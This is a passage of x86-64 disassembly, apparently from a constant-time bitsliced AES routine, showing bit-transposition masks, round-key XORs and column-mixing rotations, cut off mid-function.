    69682e1d:	49 bc aa aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaaa,%r12
    69682e24:	aa aa aa 
    69682e27:	49 bd 55 55 55 55 55 	movabs $0x5555555555555555,%r13
    69682e2e:	55 55 55 
    69682e31:	49 be 33 33 33 33 33 	movabs $0x3333333333333333,%r14
    69682e38:	33 33 33 
    69682e3b:	4c 8b 01             	mov    (%rcx),%r8
    69682e3e:	48 8b 41 08          	mov    0x8(%rcx),%rax
    69682e42:	4c 8b 49 18          	mov    0x18(%rcx),%r9
    69682e46:	48 8b 59 38          	mov    0x38(%rcx),%rbx
    69682e4a:	4c 89 c2             	mov    %r8,%rdx
    69682e4d:	4d 89 c3             	mov    %r8,%r11
    69682e50:	4c 8b 41 10          	mov    0x10(%rcx),%r8
    69682e54:	48 8d 2c 00          	lea    (%rax,%rax,1),%rbp
    69682e58:	49 d1 eb             	shr    $1,%r11
    69682e5b:	4c 21 ea             	and    %r13,%rdx
    69682e5e:	4c 21 e0             	and    %r12,%rax
    69682e61:	4c 21 e5             	and    %r12,%rbp
    69682e64:	4d 21 eb             	and    %r13,%r11
    69682e67:	4c 8d 3c 1b          	lea    (%rbx,%rbx,1),%r15
    69682e6b:	48 09 d5             	or     %rdx,%rbp
    69682e6e:	49 09 c3             	or     %rax,%r11
    69682e71:	4c 89 c2             	mov    %r8,%rdx
    69682e74:	4c 89 c6             	mov    %r8,%rsi
    69682e77:	4c 8b 41 28          	mov    0x28(%rcx),%r8
    69682e7b:	4c 21 e3             	and    %r12,%rbx
    69682e7e:	4b 8d 04 09          	lea    (%r9,%r9,1),%rax
    69682e82:	4c 21 ea             	and    %r13,%rdx
    69682e85:	48 d1 ee             	shr    $1,%rsi
    69682e88:	4c 21 e0             	and    %r12,%rax
    69682e8b:	4d 21 e1             	and    %r12,%r9
    69682e8e:	4c 21 ee             	and    %r13,%rsi
    69682e91:	48 09 d0             	or     %rdx,%rax
    69682e94:	48 8b 51 20          	mov    0x20(%rcx),%rdx
    69682e98:	4c 09 ce             	or     %r9,%rsi
    69682e9b:	4d 21 e7             	and    %r12,%r15
    69682e9e:	4b 8d 3c 00          	lea    (%r8,%r8,1),%rdi
    69682ea2:	4d 21 e0             	and    %r12,%r8
    69682ea5:	4c 21 e7             	and    %r12,%rdi
    69682ea8:	4c 8d 24 85 00 00 00 	lea    0x0(,%rax,4),%r12
    69682eaf:	00 
    69682eb0:	49 89 d1             	mov    %rdx,%r9
    69682eb3:	48 d1 ea             	shr    $1,%rdx
    69682eb6:	49 89 d2             	mov    %rdx,%r10
    69682eb9:	48 8b 51 30          	mov    0x30(%rcx),%rdx
    69682ebd:	4d 21 e9             	and    %r13,%r9
    69682ec0:	4c 09 cf             	or     %r9,%rdi
    69682ec3:	4d 21 ea             	and    %r13,%r10
    69682ec6:	4d 09 c2             	or     %r8,%r10
    69682ec9:	49 89 f8             	mov    %rdi,%r8
    69682ecc:	49 89 d1             	mov    %rdx,%r9
    69682ecf:	48 d1 ea             	shr    $1,%rdx
    69682ed2:	4d 21 e9             	and    %r13,%r9
    69682ed5:	49 21 d5             	and    %rdx,%r13
    69682ed8:	48 89 ea             	mov    %rbp,%rdx
    69682edb:	4c 09 eb             	or     %r13,%rbx
    69682ede:	4c 21 f2             	and    %r14,%rdx
    69682ee1:	4d 09 cf             	or     %r9,%r15
    69682ee4:	49 bd cc cc cc cc cc 	movabs $0xcccccccccccccccc,%r13
    69682eeb:	cc cc cc 
    69682eee:	4d 21 ec             	and    %r13,%r12
    69682ef1:	49 09 d4             	or     %rdx,%r12
    69682ef4:	48 89 ea             	mov    %rbp,%rdx
    69682ef7:	48 8d 2c b5 00 00 00 	lea    0x0(,%rsi,4),%rbp
    69682efe:	00 
    69682eff:	48 c1 ea 02          	shr    $0x2,%rdx
    69682f03:	4c 21 f2             	and    %r14,%rdx
    69682f06:	4c 21 e8             	and    %r13,%rax
    69682f09:	4c 21 ed             	and    %r13,%rbp
    69682f0c:	48 09 c2             	or     %rax,%rdx
    69682f0f:	4c 89 d8             	mov    %r11,%rax
    69682f12:	4c 21 ee             	and    %r13,%rsi
    69682f15:	4c 21 f0             	and    %r14,%rax
    69682f18:	4d 21 f0             	and    %r14,%r8
    69682f1b:	48 c1 ef 02          	shr    $0x2,%rdi
    69682f1f:	48 09 c5             	or     %rax,%rbp
    69682f22:	4c 89 d8             	mov    %r11,%rax
    69682f25:	49 89 f9             	mov    %rdi,%r9
    69682f28:	48 8d 3c 9d 00 00 00 	lea    0x0(,%rbx,4),%rdi
    69682f2f:	00 
    69682f30:	48 c1 e8 02          	shr    $0x2,%rax
    69682f34:	4c 21 eb             	and    %r13,%rbx
    69682f37:	4c 21 f0             	and    %r14,%rax
    69682f3a:	4c 21 ef             	and    %r13,%rdi
    69682f3d:	4d 21 f1             	and    %r14,%r9
    69682f40:	49 bb f0 f0 f0 f0 f0 	movabs $0xf0f0f0f0f0f0f0f0,%r11
    69682f47:	f0 f0 f0 
    69682f4a:	48 09 f0             	or     %rsi,%rax
    69682f4d:	4a 8d 34 bd 00 00 00 	lea    0x0(,%r15,4),%rsi
    69682f54:	00 
    69682f55:	4d 21 ef             	and    %r13,%r15
    69682f58:	4c 21 ee             	and    %r13,%rsi
    69682f5b:	4d 89 e5             	mov    %r12,%r13
    69682f5e:	49 c1 ec 04          	shr    $0x4,%r12
    69682f62:	4c 09 c6             	or     %r8,%rsi
    69682f65:	4d 89 d0             	mov    %r10,%r8
    69682f68:	49 c1 ea 02          	shr    $0x2,%r10
    69682f6c:	4d 21 f0             	and    %r14,%r8
    69682f6f:	4d 21 d6             	and    %r10,%r14
    69682f72:	4d 09 f9             	or     %r15,%r9
    69682f75:	49 ba 0f 0f 0f 0f 0f 	movabs $0xf0f0f0f0f0f0f0f,%r10
    69682f7c:	0f 0f 0f 
    69682f7f:	4c 09 c7             	or     %r8,%rdi
    69682f82:	49 89 d8             	mov    %rbx,%r8
    69682f85:	48 89 f3             	mov    %rsi,%rbx
    69682f88:	4d 21 d5             	and    %r10,%r13
    69682f8b:	4d 21 d4             	and    %r10,%r12
    69682f8e:	48 c1 e3 04          	shl    $0x4,%rbx
    69682f92:	4c 21 de             	and    %r11,%rsi
    69682f95:	4d 09 f0             	or     %r14,%r8
    69682f98:	4c 21 db             	and    %r11,%rbx
    69682f9b:	4c 09 e6             	or     %r12,%rsi
    69682f9e:	4c 09 eb             	or     %r13,%rbx
    69682fa1:	48 89 71 20          	mov    %rsi,0x20(%rcx)
    69682fa5:	48 89 ee             	mov    %rbp,%rsi
    69682fa8:	48 89 19             	mov    %rbx,(%rcx)
    69682fab:	48 89 fb             	mov    %rdi,%rbx
    69682fae:	48 c1 e3 04          	shl    $0x4,%rbx
    69682fb2:	4c 21 d6             	and    %r10,%rsi
    69682fb5:	48 c1 ed 04          	shr    $0x4,%rbp
    69682fb9:	4c 21 db             	and    %r11,%rbx
    69682fbc:	4c 21 d5             	and    %r10,%rbp
    69682fbf:	4c 21 df             	and    %r11,%rdi
    69682fc2:	48 09 f3             	or     %rsi,%rbx
    69682fc5:	48 89 d6             	mov    %rdx,%rsi
    69682fc8:	48 c1 ea 04          	shr    $0x4,%rdx
    69682fcc:	4c 21 d2             	and    %r10,%rdx
    69682fcf:	48 89 59 08          	mov    %rbx,0x8(%rcx)
    69682fd3:	4c 89 cb             	mov    %r9,%rbx
    69682fd6:	4d 21 d9             	and    %r11,%r9
    69682fd9:	49 09 d1             	or     %rdx,%r9
    69682fdc:	4c 89 c2             	mov    %r8,%rdx
    69682fdf:	48 c1 e3 04          	shl    $0x4,%rbx
    69682fe3:	4c 89 49 30          	mov    %r9,0x30(%rcx)
    69682fe7:	48 c1 e2 04          	shl    $0x4,%rdx
    69682feb:	49 89 c1             	mov    %rax,%r9
    69682fee:	48 c1 e8 04          	shr    $0x4,%rax
    69682ff2:	4c 21 db             	and    %r11,%rbx
    69682ff5:	4c 21 d6             	and    %r10,%rsi
    69682ff8:	4c 21 da             	and    %r11,%rdx
    69682ffb:	4d 21 d1             	and    %r10,%r9
    69682ffe:	4c 21 d0             	and    %r10,%rax
    69683001:	4d 21 d8             	and    %r11,%r8
    69683004:	48 09 fd             	or     %rdi,%rbp
    69683007:	48 09 f3             	or     %rsi,%rbx
    6968300a:	4c 09 ca             	or     %r9,%rdx
    6968300d:	49 09 c0             	or     %rax,%r8
    69683010:	48 89 69 28          	mov    %rbp,0x28(%rcx)
    69683014:	48 89 59 10          	mov    %rbx,0x10(%rcx)
    69683018:	48 89 51 18          	mov    %rdx,0x18(%rcx)
    6968301c:	4c 89 41 38          	mov    %r8,0x38(%rcx)
    69683020:	5b                   	pop    %rbx
    69683021:	5e                   	pop    %rsi
    69683022:	5f                   	pop    %rdi
    69683023:	5d                   	pop    %rbp
    69683024:	41 5c                	pop    %r12
    69683026:	41 5d                	pop    %r13
    69683028:	41 5e                	pop    %r14
    6968302a:	41 5f                	pop    %r15
    6968302c:	c3                   	ret
    6968302d:	41 57                	push   %r15
    6968302f:	41 56                	push   %r14
    69683031:	41 55                	push   %r13
    69683033:	41 54                	push   %r12
    69683035:	55                   	push   %rbp
    69683036:	57                   	push   %rdi
    69683037:	56                   	push   %rsi
    69683038:	53                   	push   %rbx
    69683039:	48 81 ec 38 01 00 00 	sub    $0x138,%rsp
    69683040:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
    69683047:	00 
    69683048:	49 89 d2             	mov    %rdx,%r10
    6968304b:	48 89 cd             	mov    %rcx,%rbp
    6968304e:	4c 89 8c 24 98 01 00 	mov    %r9,0x198(%rsp)
    69683055:	00 
    69683056:	48 8d 9c 24 f0 00 00 	lea    0xf0(%rsp),%rbx
    6968305d:	00 
    6968305e:	ba 40 00 00 00       	mov    $0x40,%edx
    69683063:	48 89 f1             	mov    %rsi,%rcx
    69683066:	e8 61 e9 ff ff       	call   0x696819cc
    6968306b:	48 89 d9             	mov    %rbx,%rcx
    6968306e:	ba 40 00 00 00       	mov    $0x40,%edx
    69683073:	e8 54 e9 ff ff       	call   0x696819cc
    69683078:	48 8d 56 20          	lea    0x20(%rsi),%rdx
    6968307c:	49 89 d8             	mov    %rbx,%r8
    6968307f:	48 89 f1             	mov    %rsi,%rcx
    69683082:	49 8b 02             	mov    (%r10),%rax
    69683085:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
    6968308c:	00 
    6968308d:	49 8b 42 08          	mov    0x8(%r10),%rax
    69683091:	48 89 84 24 f8 00 00 	mov    %rax,0xf8(%rsp)
    69683098:	00 
    69683099:	e8 a9 e3 ff ff       	call   0x69681447
    6968309e:	4c 8d 43 10          	lea    0x10(%rbx),%r8
    696830a2:	48 8d 56 28          	lea    0x28(%rsi),%rdx
    696830a6:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
    696830aa:	e8 98 e3 ff ff       	call   0x69681447
    696830af:	4c 8d 43 20          	lea    0x20(%rbx),%r8
    696830b3:	48 8d 56 30          	lea    0x30(%rsi),%rdx
    696830b7:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
    696830bb:	e8 87 e3 ff ff       	call   0x69681447
    696830c0:	48 8d 56 38          	lea    0x38(%rsi),%rdx
    696830c4:	4c 8d 43 30          	lea    0x30(%rbx),%r8
    696830c8:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
    696830cc:	e8 76 e3 ff ff       	call   0x69681447
    696830d1:	48 89 f1             	mov    %rsi,%rcx
    696830d4:	e8 38 fd ff ff       	call   0x69682e11
    696830d9:	48 8b 85 c0 03 00 00 	mov    0x3c0(%rbp),%rax
    696830e0:	48 89 c3             	mov    %rax,%rbx
    696830e3:	48 ff c8             	dec    %rax
    696830e6:	48 c1 e3 06          	shl    $0x6,%rbx
    696830ea:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
    696830f1:	00 
    696830f2:	48 8d 46 40          	lea    0x40(%rsi),%rax
    696830f6:	48 01 eb             	add    %rbp,%rbx
    696830f9:	48 8b 13             	mov    (%rbx),%rdx
    696830fc:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
    69683103:	00 
    69683104:	48 31 94 24 b0 00 00 	xor    %rdx,0xb0(%rsp)
    6968310b:	00 
    6968310c:	48 8b 53 08          	mov    0x8(%rbx),%rdx
    69683110:	48 31 94 24 b8 00 00 	xor    %rdx,0xb8(%rsp)
    69683117:	00 
    69683118:	48 8b 53 10          	mov    0x10(%rbx),%rdx
    6968311c:	48 31 94 24 c0 00 00 	xor    %rdx,0xc0(%rsp)
    69683123:	00 
    69683124:	48 8b 53 18          	mov    0x18(%rbx),%rdx
    69683128:	48 31 94 24 c8 00 00 	xor    %rdx,0xc8(%rsp)
    6968312f:	00 
    69683130:	48 8b 53 20          	mov    0x20(%rbx),%rdx
    69683134:	48 31 94 24 d0 00 00 	xor    %rdx,0xd0(%rsp)
    6968313b:	00 
    6968313c:	48 8b 53 28          	mov    0x28(%rbx),%rdx
    69683140:	48 31 94 24 d8 00 00 	xor    %rdx,0xd8(%rsp)
    69683147:	00 
    69683148:	48 8b 53 30          	mov    0x30(%rbx),%rdx
    6968314c:	48 31 94 24 e0 00 00 	xor    %rdx,0xe0(%rsp)
    69683153:	00 
    69683154:	48 8b 53 38          	mov    0x38(%rbx),%rdx
    69683158:	48 31 94 24 e8 00 00 	xor    %rdx,0xe8(%rsp)
    6968315f:	00 
    69683160:	48 83 bc 24 90 00 00 	cmpq   $0x0,0x90(%rsp)
    69683167:	00 00 
    69683169:	0f 8e cb 03 00 00    	jle    0x6968353a
    6968316f:	b9 ff 0f 00 00       	mov    $0xfff,%ecx
    69683174:	48 89 f2             	mov    %rsi,%rdx
    69683177:	49 b9 00 00 00 00 ff 	movabs $0xff00000000,%r9
    6968317e:	00 00 00 
    69683181:	49 b8 00 00 00 00 00 	movabs $0xf000000000000000,%r8
    69683188:	00 00 f0 
    6968318b:	48 c1 e1 30          	shl    $0x30,%rcx
    6968318f:	4c 8b 12             	mov    (%rdx),%r10
    69683192:	bf ff 00 00 00       	mov    $0xff,%edi
    69683197:	48 83 c2 08          	add    $0x8,%rdx
    6968319b:	48 c1 e7 28          	shl    $0x28,%rdi
    6968319f:	4c 89 d0             	mov    %r10,%rax
    696831a2:	4d 89 d3             	mov    %r10,%r11
    696831a5:	48 c1 e0 04          	shl    $0x4,%rax
    696831a9:	49 c1 eb 0c          	shr    $0xc,%r11
    696831ad:	41 81 e3 00 00 0f 00 	and    $0xf0000,%r11d
    696831b4:	25 00 00 f0 ff       	and    $0xfff00000,%eax
    696831b9:	4c 09 d8             	or     %r11,%rax
    696831bc:	45 0f b7 da          	movzwl %r10w,%r11d
    696831c0:	4c 09 d8             	or     %r11,%rax
    696831c3:	4d 89 d3             	mov    %r10,%r11
    696831c6:	49 c1 e3 08          	shl    $0x8,%r11
    696831ca:	49 21 fb             	and    %rdi,%r11
    696831cd:	4c 09 d8             	or     %r11,%rax
    696831d0:	4d 89 d3             	mov    %r10,%r11
    696831d3:	49 c1 eb 08          	shr    $0x8,%r11
    696831d7:	4d 21 cb             	and    %r9,%r11
    696831da:	4c 09 d8             	or     %r11,%rax
    696831dd:	4d 89 d3             	mov    %r10,%r11
    696831e0:	49 c1 ea 04          	shr    $0x4,%r10
    696831e4:	49 c1 e3 0c          	shl    $0xc,%r11
    696831e8:	49 21 ca             	and    %rcx,%r10
    696831eb:	4d 21 c3             	and    %r8,%r11
    696831ee:	4c 09 d8             	or     %r11,%rax
    696831f1:	4c 09 d0             	or     %r10,%rax
    696831f4:	48 89 42 f8          	mov    %rax,-0x8(%rdx)
    696831f8:	48 39 94 24 a8 00 00 	cmp    %rdx,0xa8(%rsp)
    696831ff:	00 
    69683200:	75 8d                	jne    0x6968318f
    69683202:	48 89 f1             	mov    %rsi,%rcx
    69683205:	e8 e5 e5 ff ff       	call   0x696817ef
    6968320a:	48 8b 84 24 d0 00 00 	mov    0xd0(%rsp),%rax
    69683211:	00 
    69683212:	48 33 43 e0          	xor    -0x20(%rbx),%rax
    69683216:	4c 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%r9
    6968321d:	00 
    6968321e:	4c 33 4b c0          	xor    -0x40(%rbx),%r9
    69683222:	4c 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%r10
    69683229:	00 
    6968322a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
    6968322f:	48 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%rax
    69683236:	00 
    69683237:	48 33 43 e8          	xor    -0x18(%rbx),%rax
    6968323b:	4c 89 c9             	mov    %r9,%rcx
    6968323e:	4c 33 53 c8          	xor    -0x38(%rbx),%r10
    69683242:	48 c1 c9 10          	ror    $0x10,%rcx
    69683246:	4c 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%r14
    6968324d:	00 
    6968324e:	49 89 cd             	mov    %rcx,%r13
    69683251:	4c 33 73 d8          	xor    -0x28(%rbx),%r14
    69683255:	49 89 c4             	mov    %rax,%r12
    69683258:	4c 8b 9c 24 e8 00 00 	mov    0xe8(%rsp),%r11
    6968325f:	00 
    69683260:	49 c1 cc 10          	ror    $0x10,%r12
    69683264:	4c 33 5b f8          	xor    -0x8(%rbx),%r11
    69683268:	4d 89 d7             	mov    %r10,%r15
    6968326b:	4d 31 e5             	xor    %r12,%r13
    6968326e:	48 8b bc 24 e0 00 00 	mov    0xe0(%rsp),%rdi
    69683275:	00 
    69683276:	49 c1 cf 10          	ror    $0x10,%r15
    6968327a:	4c 89 ac 24 80 00 00 	mov    %r13,0x80(%rsp)
    69683281:	00 
    69683282:	4d 89 cd             	mov    %r9,%r13
    69683285:	48 33 7b f0          	xor    -0x10(%rbx),%rdi
    69683289:	4d 31 d5             	xor    %r10,%r13
    6968328c:	48 8b 94 24 c0 00 00 	mov    0xc0(%rsp),%rdx
    69683293:	00 
    69683294:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
    69683299:	4c 89 6c 24 58       	mov    %r13,0x58(%rsp)
    6968329e:	4d 89 f5             	mov    %r14,%r13
    696832a1:	48 33 53 d0          	xor    -0x30(%rbx),%rdx
    696832a5:	49 31 c5             	xor    %rax,%r13
    696832a8:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
    696832ad:	49 c1 cb 10          	ror    $0x10,%r11
    696832b1:	4c 89 ac 24 a0 00 00 	mov    %r13,0xa0(%rsp)
    696832b8:	00 
    696832b9:	4c 8b 6c 24 28       	mov    0x28(%rsp),%r13
    696832be:	49 89 f8             	mov    %rdi,%r8
    696832c1:	49 c1 c8 10          	ror    $0x10,%r8
    696832c5:	49 89 d7             	mov    %rdx,%r15
    696832c8:	49 c1 cf 10          	ror    $0x10,%r15
    696832cc:	49 31 fd             	xor    %rdi,%r13
    696832cf:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
    696832d4:	4d 89 f7             	mov    %r14,%r15
    696832d7:	4c 89 ac 24 88 00 00 	mov    %r13,0x88(%rsp)
    696832de:	00 
    696832df:	4d 89 d5             	mov    %r10,%r13
    696832e2:	49 c1 cf 10          	ror    $0x10,%r15
    696832e6:	49 31 d5             	xor    %rdx,%r13
    696832e9:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
    696832ee:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
    696832f3:	4c 89 6c 24 68       	mov    %r13,0x68(%rsp)
    696832f8:	4c 8b 6c 24 50       	mov    0x50(%rsp),%r13
    696832fd:	49 c1 cf 10          	ror    $0x10,%r15
    69683301:	49 31 c5             	xor    %rax,%r13
    69683304:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
    69683309:	4d 89 cf             	mov    %r9,%r15
    6968330c:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
    69683311:	49 89 d5             	mov    %rdx,%r13
    69683314:	49 31 c7             	xor    %rax,%r15
    69683317:	4d 31 f5             	xor    %r14,%r13
    6968331a:	4c 89 6c 24 70       	mov    %r13,0x70(%rsp)
    6968331f:	49 89 c5             	mov    %rax,%r13
    69683322:	49 31 fd             	xor    %rdi,%r13
    69683325:	4c 89 ac 24 98 00 00 	mov    %r13,0x98(%rsp)
    6968332c:	00 
    6968332d:	4c 33 74 24 50       	xor    0x50(%rsp),%r14
    69683332:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
    69683337:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
    6968333c:	4c 33 b4 24 80 00 00 	xor    0x80(%rsp),%r14
    69683343:	00 
    69683344:	4d 31 de             	xor    %r11,%r14
    69683347:	4d 31 ee             	xor    %r13,%r14
    6968334a:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
    69683351:	00 
    69683352:	49 31 fd             	xor    %rdi,%r13
    69683355:	4d 31 fd             	xor    %r15,%r13
    69683358:	49 c1 c5 20          	rol    $0x20,%r13
    6968335c:	49 31 c2             	xor    %rax,%r10
    6968335f:	4c 33 54 24 28       	xor    0x28(%rsp),%r10
    69683364:	49 31 d1             	xor    %rdx,%r9
    69683367:	4d 31 ee             	xor    %r13,%r14
    6968336a:	4c 8b 6c 24 30       	mov    0x30(%rsp),%r13
    6968336f:	49 31 f9             	xor    %rdi,%r9
    69683372:	4c 33 54 24 30       	xor    0x30(%rsp),%r10
    69683377:	48 31 c2             	xor    %rax,%rdx
    6968337a:	4c 89 b4 24 b0 00 00 	mov    %r14,0xb0(%rsp)
    69683381:	00 
    69683382:	4c 33 4c 24 38       	xor    0x38(%rsp),%r9
    69683387:	48 31 fa             	xor    %rdi,%rdx
    6968338a:	48 31 ca             	xor    %rcx,%rdx
    6968338d:	48 33 54 24 38       	xor    0x38(%rsp),%rdx
    69683392:	49 31 cd             	xor    %rcx,%r13
    69683395:	48 33 54 24 40       	xor    0x40(%rsp),%rdx
    6968339a:	4d 31 e5             	xor    %r12,%r13
    6968339d:	4d 31 e2             	xor    %r12,%r10
    696833a0:	4d 31 c5             	xor    %r8,%r13
    696833a3:	4d 31 c2             	xor    %r8,%r10
    696833a6:	4d 31 c1             	xor    %r8,%r9
    696833a9:	4d 31 dd             	xor    %r11,%r13
    696833ac:	49 c1 c2 20          	rol    $0x20,%r10
    696833b0:	4d 31 d9             	xor    %r11,%r9
    696833b3:	4d 31 ef             	xor    %r13,%r15
    696833b6:	49 c1 c1 20          	rol    $0x20,%r9
    696833ba:	4c 31 e2             	xor    %r12,%rdx
    696833bd:	4d 31 d7             	xor    %r10,%r15
    696833c0:	4c 8b 54 24 30       	mov    0x30(%rsp),%r10
    696833c5:	4c 33 54 24 38       	xor    0x38(%rsp),%r10
    696833ca:	4c 89 bc 24 b8 00 00 	mov    %r15,0xb8(%rsp)
    696833d1:	00 
    696833d2:	49 31 fa             	xor    %rdi,%r10
    696833d5:	4d 31 c2             	xor    %r8,%r10
    696833d8:	4d 31 da             	xor    %r11,%r10
    696833db:	4c 33 54 24 58       	xor    0x58(%rsp),%r10
    696833e0:	4d 31 d1             	xor    %r10,%r9
    696833e3:	48 33 54 24 58       	xor    0x58(%rsp),%rdx
    696833e8:	48 33 8c 24 88 00 00 	xor    0x88(%rsp),%rcx
    696833ef:	00 
    696833f0:	4c 89 8c 24 c0 00 00 	mov    %r9,0xc0(%rsp)
    696833f7:	00 
    696833f8:	48 33 4c 24 40       	xor    0x40(%rsp),%rcx
    696833fd:	4c 31 e1             	xor    %r12,%rcx
    69683400:	4c 31 d9             	xor    %r11,%rcx
    69683403:	48 33 4c 24 58       	xor    0x58(%rsp),%rcx
    69683408:	48 33 8c 24 a0 00 00 	xor    0xa0(%rsp),%rcx
    6968340f:	00 
    69683410:	48 c1 c1 20          	rol    $0x20,%rcx
    69683414:	48 31 ca             	xor    %rcx,%rdx
    69683417:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
    6968341c:	48 89 94 24 c8 00 00 	mov    %rdx,0xc8(%rsp)
    69683423:	00 
    69683424:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
    69683429:	48 33 54 24 40       	xor    0x40(%rsp),%rdx
    6968342e:	48 33 54 24 48       	xor    0x48(%rsp),%rdx
    69683433:	48 33 4c 24 48       	xor    0x48(%rsp),%rcx
    69683438:	48 33 4c 24 28       	xor    0x28(%rsp),%rcx
    6968343d:	4c 31 e2             	xor    %r12,%rdx
    69683440:	4c 31 c2             	xor    %r8,%rdx
    69683443:	4c 31 e1             	xor    %r12,%rcx
    69683446:	4c 31 da             	xor    %r11,%rdx
    69683449:	48 33 94 24 a0 00 00 	xor    0xa0(%rsp),%rdx
    69683450:	00 
    69683451:	4c 31 c1             	xor    %r8,%rcx
    69683454:	48 33 54 24 68       	xor    0x68(%rsp),%rdx
    69683459:	48 33 4c 24 68       	xor    0x68(%rsp),%rcx
    6968345e:	48 33 4c 24 60       	xor    0x60(%rsp),%rcx
    69683463:	4c 8b b4 24 88 00 00 	mov    0x88(%rsp),%r14
    6968346a:	00 
    6968346b:	48 c1 c1 20          	rol    $0x20,%rcx
    6968346f:	48 31 ca             	xor    %rcx,%rdx
    69683472:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
    69683477:	48 89 94 24 d0 00 00 	mov    %rdx,0xd0(%rsp)
    6968347e:	00 
    6968347f:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
    69683484:	4c 31 e1             	xor    %r12,%rcx
    69683487:	48 31 fa             	xor    %rdi,%rdx
    6968348a:	48 33 54 24 38       	xor    0x38(%rsp),%rdx
    6968348f:	48 33 54 24 48       	xor    0x48(%rsp),%rdx
    69683494:	4c 31 e2             	xor    %r12,%rdx
    69683497:	4c 31 c2             	xor    %r8,%rdx
    6968349a:	4c 31 da             	xor    %r11,%rdx
    6968349d:	48 33 54 24 70       	xor    0x70(%rsp),%rdx
    696834a2:	4c 31 c1             	xor    %r8,%rcx
    696834a5:	48 83 eb 40          	sub    $0x40,%rbx
    696834a9:	48 33 44 24 28       	xor    0x28(%rsp),%rax
    696834ae:	4c 31 d9             	xor    %r11,%rcx
    696834b1:	48 33 44 24 40       	xor    0x40(%rsp),%rax
    696834b6:	4c 33 74 24 40       	xor    0x40(%rsp),%r14
    696834bb:	48 33 4c 24 70       	xor    0x70(%rsp),%rcx
    696834c0:	48 33 8c 24 98 00 00 	xor    0x98(%rsp),%rcx
    696834c7:	00 
    696834c8:	48 ff 8c 24 90 00 00 	decq   0x90(%rsp)
    696834cf:	00 
    696834d0:	4c 31 e0             	xor    %r12,%rax
    696834d3:	4c 31 c0             	xor    %r8,%rax
    696834d6:	4d 31 c6             	xor    %r8,%r14
    696834d9:	4c 33 44 24 48       	xor    0x48(%rsp),%r8
    696834de:	4c 31 d8             	xor    %r11,%rax
    696834e1:	4d 31 de             	xor    %r11,%r14
    696834e4:	4c 33 74 24 78       	xor    0x78(%rsp),%r14
    696834e9:	48 33 44 24 78       	xor    0x78(%rsp),%rax
    696834ee:	48 c1 c1 20          	rol    $0x20,%rcx
    696834f2:	48 31 ca             	xor    %rcx,%rdx
    696834f5:	4c 31 c7             	xor    %r8,%rdi
    696834f8:	48 89 94 24 d8 00 00 	mov    %rdx,0xd8(%rsp)
    696834ff:	00 
    69683500:	4c 31 df             	xor    %r11,%rdi
    69683503:	4c 33 5c 24 48       	xor    0x48(%rsp),%r11
    69683508:	49 c1 c6 20          	rol    $0x20,%r14
    6968350c:	4c 33 5c 24 28       	xor    0x28(%rsp),%r11
    69683511:	49 31 c6             	xor    %rax,%r14
    69683514:	4c 33 5c 24 60       	xor    0x60(%rsp),%r11
    69683519:	4c 89 b4 24 e0 00 00 	mov    %r14,0xe0(%rsp)
    69683520:	00 
    69683521:	48 33 7c 24 60       	xor    0x60(%rsp),%rdi
    69683526:	49 c1 c3 20          	rol    $0x20,%r11
    6968352a:	4c 31 df             	xor    %r11,%rdi
    6968352d:	48 89 bc 24 e8 00 00 	mov    %rdi,0xe8(%rsp)
    69683534:	00 
    69683535:	e9 26 fc ff ff       	jmp    0x69683160
    6968353a:	48 8d 4e 40          	lea    0x40(%rsi),%rcx
    6968353e:	48 89 f2             	mov    %rsi,%rdx
    69683541:	49 bb 00 00 00 00 00 	movabs $0xff0000000000,%r11
    69683548:	ff 00 00 
    6968354b:	49 ba 00 00 00 00 ff 	movabs $0xff00000000,%r10
    69683552:	00 00 00 
    69683555:	49 b9 00 00 00 00 00 	movabs $0xf000000000000000,%r9
    6968355c:	00 00 f0 
    6968355f:	49 b8 00 00 00 00 00 	movabs $0xfff000000000000,%r8
    69683566:	00 ff 0f 
    69683569:	48 8b 1a             	mov    (%rdx),%rbx
    6968356c:	48 83 c2 08          	add    $0x8,%rdx
    69683570:	48 89 d8             	mov    %rbx,%rax
    69683573:	48 89 df             	mov    %rbx,%rdi
    69683576:	48 c1 e0 04          	shl    $0x4,%rax
    6968357a:	48 c1 ef 0c          	shr    $0xc,%rdi
    6968357e:	81 e7 00 00 0f 00    	and    $0xf0000,%edi
    69683584:	25 00 00 f0 ff       	and    $0xfff00000,%eax
    69683589:	48 09 f8             	or     %rdi,%rax
    6968358c:	0f b7 fb             	movzwl %bx,%edi
    6968358f:	48 09 f8             	or     %rdi,%rax
    69683592:	48 89 df             	mov    %rbx,%rdi
    69683595:	48 c1 e7 08          	shl    $0x8,%rdi
    69683599:	4c 21 df             	and    %r11,%rdi
    6968359c:	48 09 f8             	or     %rdi,%rax
    6968359f:	48 89 df             	mov    %rbx,%rdi
    696835a2:	48 c1 ef 08          	shr    $0x8,%rdi
    696835a6:	4c 21 d7             	and    %r10,%rdi
    696835a9:	48 09 f8             	or     %rdi,%rax
    696835ac:	48 89 df             	mov    %rbx,%rdi
    696835af:	48 c1 eb 04          	shr    $0x4,%rbx
    696835b3:	48 c1 e7 0c          	shl    $0xc,%rdi
